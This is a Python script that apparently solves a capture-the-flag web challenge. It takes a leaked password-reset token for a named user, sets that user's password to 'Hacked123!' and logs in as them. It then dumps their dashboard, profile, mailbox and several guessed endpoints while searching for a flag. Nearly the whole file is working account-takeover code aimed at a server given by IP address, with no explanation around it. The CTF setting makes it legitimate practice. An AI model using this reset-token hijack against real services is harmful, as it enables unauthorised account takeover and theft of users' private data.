#!/usr/bin/env python3
"""
Use the new token that appeared
"""

import requests
import re

URL = "http://138.199.163.92:12770"

# The new token that appeared
token = "1bfd299a-3659-45b9-87eb-261c7d5c88b4"

print("="*70)
print(f"USING TOKEN: {token}")
print("="*70)

session = requests.Session()

# Access reset page
print("\n[1] Accessing reset page...")
r = session.get(f"{URL}/reset?token={token}", timeout=10)

print(f"Status: {r.status_code}")

with open('reset_page_new_token.html', 'w', encoding='utf-8') as f:
    f.write(r.text)

print(f"\nPage content:")
print(r.text)

# Check for Om Nagda
if 'om.nagda' in r.text.lower():
    print("\n✓ This is Om Nagda's reset token!")

# Reset password
print("\n[2] Resetting password...")
new_password = "Hacked123!"

r = session.post(f"{URL}/reset?token={token}", data={
    'password': new_password,
    'confirm_password': new_password
}, timeout=10)

print(f"Status: {r.status_code}")
print(f"Response: {r.text[:500]}")

# Login as Om Nagda
print("\n[3] Logging in as Om Nagda...")
new_session = requests.Session()

r = new_session.post(f"{URL}/login", data={
    'email': 'om.nagda@kaalchakractf.com',
    'password': new_password
}, timeout=10)

print(f"Status: {r.status_code}")
print(f"URL: {r.url}")
print(f"Cookies: {new_session.cookies.get_dict()}")

# Check dashboard
print("\n[4] Checking Om Nagda's dashboard...")
r = new_session.get(f"{URL}/dashboard", timeout=10)

print(f"Status: {r.status_code}")

with open('om_nagda_dashboard.html', 'w', encoding='utf-8') as f:
    f.write(r.text)

print(f"\nDashboard content:")
print(r.text)

# Check for flag
if 'Kaal{' in r.text:
    flags = re.findall(r'Kaal\{[^}]+\}', r.text)
    for flag in flags:
        print(f"\n*** FLAG FOUND: {flag} ***")
        exit(0)

# Check profile
print("\n[5] Checking Om Nagda's profile...")
r = new_session.get(f"{URL}/profile", timeout=10)

print(f"Status: {r.status_code}")
print(f"\nProfile content:")
print(r.text)

# Check for flag
if 'Kaal{' in r.text:
    flags = re.findall(r'Kaal\{[^}]+\}', r.text)
    for flag in flags:
        print(f"\n*** FLAG FOUND: {flag} ***")
        exit(0)

# Check mailbox
print("\n[6] Checking Om Nagda's mailbox...")
r = new_session.get(f"{URL}/mailbox", timeout=10)

print(f"Status: {r.status_code}")
print(f"\nMailbox content:")
print(r.text)

# Check for flag
if 'Kaal{' in r.text:
    flags = re.findall(r'Kaal\{[^}]+\}', r.text)
    for flag in flags:
        print(f"\n*** FLAG FOUND: {flag} ***")
        exit(0)

# Check all other endpoints
print("\n[7] Checking other endpoints...")
endpoints = ['/files', '/cases', '/evidence', '/documents', '/vault']

for endpoint in endpoints:
    try:
        r = new_session.get(f"{URL}{endpoint}", timeout=5)
        if r.status_code == 200:
            print(f"\n✓ {endpoint}: {r.status_code}")
            print(r.text[:500])
            
            if 'Kaal{' in r.text:
                flags = re.findall(r'Kaal\{[^}]+\}', r.text)
                for flag in flags:
                    print(f"\n*** FLAG FOUND: {flag} ***")
                    exit(0)
    except:
        pass

print("\n" + "="*70)
print("Check the saved HTML files")
print("="*70)
